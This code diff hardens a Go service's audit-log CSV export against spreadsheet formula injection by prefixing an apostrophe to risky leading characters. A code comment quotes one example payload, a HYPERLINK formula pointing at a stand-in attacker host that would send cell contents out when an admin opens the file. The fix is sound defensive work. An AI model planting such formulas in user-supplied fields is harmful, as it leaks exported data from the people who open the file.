@@ -599,9 +599,33 @@ func (b *Bot) auditRoutes(mux *http.ServeMux) {
 		cw.Write([]string{"id", "time", "action", "outcome", "via", "actor_id", "actor_email", "actor_name", "actor_slack",
 			"team_id", "target_kind", "target_id", "target_name", "ip", "user_agent", "details"})
 		for _, e := range events {
-			cw.Write([]string{strconv.FormatInt(e.ID, 10), e.At, e.Action, e.Outcome, e.Via, e.ActorPublic, e.ActorEmail, e.ActorName, e.ActorSlack,
-				e.TeamID, e.TargetKind, e.TargetID, e.TargetName, e.IP, e.UserAgent, string(e.Details)})
+			cw.Write(csvRow(strconv.FormatInt(e.ID, 10), e.At, e.Action, e.Outcome, e.Via, e.ActorPublic, e.ActorEmail, e.ActorName, e.ActorSlack,
+				e.TeamID, e.TargetKind, e.TargetID, e.TargetName, e.IP, e.UserAgent, string(e.Details)))
 		}
 		cw.Flush()
 	}))
+}
+
+// csvCell neutralises a spreadsheet formula hiding in an exported field. Excel, Sheets and
+// LibreOffice treat a cell that begins with = + - @ (or a tab or carriage return) as a formula, so
+// a value like =HYPERLINK("https://attacker…"&A1) typed into a member's name, or a sign-in's
+// User-Agent — both of which reach these exports from outside, the User-Agent even from an
+// unauthenticated request — would run when an admin opens the file. An apostrophe makes it literal.
+func csvCell(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
+}
+
+// csvRow neutralises every cell in a row.
+func csvRow(cells ...string) []string {
+	for i := range cells {
+		cells[i] = csvCell(cells[i])
+	}
+	return cells
 }
